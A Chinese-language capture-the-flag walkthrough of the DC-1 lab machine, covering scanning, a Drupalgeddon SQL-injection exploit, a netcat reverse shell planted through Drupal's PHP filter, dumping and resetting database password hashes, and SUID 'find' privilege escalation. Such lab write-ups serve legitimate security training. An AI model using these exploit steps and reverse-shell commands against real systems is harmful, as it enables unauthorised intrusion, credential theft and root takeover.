## DC-1渗透测试过程

### 端口扫描

```bash
nmap -sC -sV -Pn 192.168.56.119
```

```bash
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
```

开了三个端口

### 访问web页面

发现是`drupal`这个cms，用`droopescan`进行扫描

```bash
droopescan scan drupal -u http://192.168.56.119
```

```bash
[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://192.168.56.119/user/login

[+] Scan finished (0:07:52.768780 elapsed)
```

扫到大概版本和登录页面

#### 漏洞发现和利用

寻找相关漏洞

```bash
searchsploit drupal 7
```

`Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)`

找到了这个`POC`，尝试是否可以利用

```bash
python2 34992.py -t http://192.168.56.119/ -u dabai -p 123456
```

然后就可以登录该账号，找到**flag3**

> Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
>
> 特殊的perms将有助于查找密码，但您需要执行该命令才能找到shadow中的内容

找到`Modules`，勾选**`PHP filter`**，并设置权限。，将`Use the PHPcode text format`设置为管理员

![image-20240418204912750](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240418204912750.png)

这样我们就可以在文章里写`PHP代码`

```php
<?php system("nc -e /bin/bash 192.168.56.101 1234");?>
```

找到**flag1**

```bash
www-data@DC-1:/var/www$ cat flag1.txt
Every good CMS needs a config file - and so do you.
```

#### 利用mysql重置密码

提示查看配置文件，位于Drupal安装目录下的/sites/default/文件夹中

```bash
www-data@DC-1:/var/www/sites/default$ cat settings.php
cat settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

发现**flag2**

```
flag2
Brute force and dictionary attacks aren't the
only ways to gain access (and you WILL need access).
What can you do with these credentials?
爆破攻击和字典攻击不是
获得访问权限的唯一方法(您将需要访问权限)。
你能用这些证书做什么?
```

找到`Mysql`的账户，尝试登录

```bash
mysql -udbuser -pR0ck3t
```

然后在`drupaldb`数据库，`users`表下，查看了用户名和密码

```sql
select name,pass from users;
```

```
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |                                     
| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |                                     
+-------+---------------------------------------------------------+
```

用john进行爆破哈希，发现那个用户都爆破不出来，那就尝试修改

`john admin --wordlist=/usr/share/wordlists/rockyou.txt`

`john Fred --wordlist=/usr/share/wordlists/rockyou.txt`

`drupal`常用密码加密是`MD5格式`，但是7.0以后因为安全性问题将加密方式改成了hash加密

[Drupal7密码重置](http://drupalchina.cn/node/1964)

```bash
www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456
php ./scripts/password-hash.sh 123456

password: 123456                hash: $S$DmIUpIuKdJDVbkgk5BN6BFLX1ASLJB5H9LCYdzwjflmNjrOOE4zy
```

一定不要进`scripts`目录，然后修改`users`表

```
update users set pass='$S$DdjovdQivVxu7Nqjmxb1bbxZtzuiEBHDfqogPLcuSUMtB25gM/u/' where name='admin';
```

然后就可以登录了(这里和前面增加的账号是一样的效果，预期解应该是这样)

### 提权

那就回到靶机

查看`passwd`文件，有一个`flag4`用户

```bash
www-data@DC-1:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
......
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

进入`flag4`的家目录，发现**flag4**

```bash
bash-4.2$ ls -l
ls -l
total 4
-rw-r--r-- 1 flag4 flag4 125 Feb 19  2019 flag4.txt
bash-4.2$ cat flag4.txt
cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

`shadow`文件还不能查看

`sudo`命令不能用，查看有suid权限的文件，一眼看到`find`

```bash
www-data@DC-1:/var/www$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

find提权

```bash
www-data@DC-1:/var/www$ find / -exec "/bin/sh" \;
find / -exec "/bin/sh" \;
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

直接就拿到了root权限，拿到最终flag

```bash
# cd /root
cd /root
# ls
ls
thefinalflag.txt
# cat t*
cat t*
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

### 总结

> 1.我并没有按MSF的方法进行漏洞利用，而是先打web漏洞得到后台账号，然后利用`PHP filter`模块执行`PHP代码`，反弹shell,提权
>
> 2.认识一款`droopescan`扫描器，可以扫`drupal这个cms`
>
> 3.`drupal`数据库中密码的加密方式是利用`/scripts/password-hash.sh`这个文件
>
> 4.`find`提权`find / -exec "/bin/sh" \;`

